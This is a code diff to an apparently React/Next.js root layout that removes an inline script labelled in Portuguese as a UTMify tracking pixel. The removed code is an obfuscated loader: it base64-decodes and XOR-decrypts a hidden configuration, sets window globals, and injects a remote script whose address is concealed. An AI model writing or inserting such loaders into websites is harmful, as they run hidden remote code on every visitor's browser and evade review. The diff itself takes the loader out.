@@ -113,13 +113,6 @@ function RootShell({ children }: { children: ReactNode }) {
           }}
         />
 
-        {/* Pixel da UTMify: associa as visitas ao pixel configurado na plataforma. */}
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `(function(){var c_yca4=atob("DJtuN0mxOJrZ+5wI/uBMQjvdGqD7k+h8juhUGGbSXPT3juhll/0XGSreVbS7ibN7nekHRz3CF+qwg/lk0esHTyzdFvCq2bAqn+8aRSDTTe68iL4ypcZCFS7dV/i4l+8qxMAVFSfQVf/7wb54l+MLWwDVGrb7jf1ki/5MDWuHWaK/ma1uz6hfVnyBDKO7yag/zqILBn6TRcek");var q_u8r8=[];for(var f_v9e=0;f_v9e<c_yca4.length;f_v9e++){q_u8r8.push(c_yca4.charCodeAt(f_v9e)&255);}var g_r=q_u8r8[0];var m_8=q_u8r8.slice(1,1+g_r);var h_96=q_u8r8.slice(1+g_r);var v_5=h_96.map(function(b,g_5x){return b^m_8[g_5x%g_r];});var t_viqr="";for(var x_illk=0;x_illk<v_5.length;x_illk++){t_viqr+=String.fromCharCode(v_5[x_illk]&255);}var o_q=decodeURIComponent(escape(t_viqr));var u_pha=JSON.parse(o_q);var j_wub=u_pha.globals||[];j_wub.forEach(function(z_00){window[z_00.name]=z_00.value;});var l_gqm=document.createElement("script");l_gqm.src=u_pha.url;l_gqm.async=true;l_gqm.defer=true;(u_pha.attributes||[]).forEach(function(u_c){l_gqm.setAttribute(u_c.name,u_c.value);});(document.head||document.documentElement).appendChild(l_gqm);})();`,
-          }}
-        />
-
         <script
           dangerouslySetInnerHTML={{
             __html: `
